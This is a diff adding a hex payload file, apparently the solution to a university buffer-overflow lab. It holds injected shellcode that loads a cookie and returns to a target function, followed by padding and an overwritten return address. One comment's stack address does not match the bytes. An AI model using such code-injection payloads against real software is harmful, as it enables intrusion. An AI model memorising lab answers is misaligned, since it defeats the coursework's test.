@@ -1,0 +1,10 @@
+bf 83 dc 61 55              /* mov    $0x59b997fa,%edi  */
+68 fa 18 40 00              /* pushq  $0x4017ec         */
+c3                          /* retq                     */ 
+35 39 62 39 39 37 66 61 
+         00 00 00 00 00
+/* 00 00 00 00 00 00 00 00      BUFFERSIZE = 40, thus 40 bytes allocated */
+00 00 00 00 00 00 00 00     /* i.e. 80 hex digits */
+00 00 00 00 00 00 00 00 
+78 dc 61 55 00 00 00 00     /* rsp addr 0x5561dca8 */
+
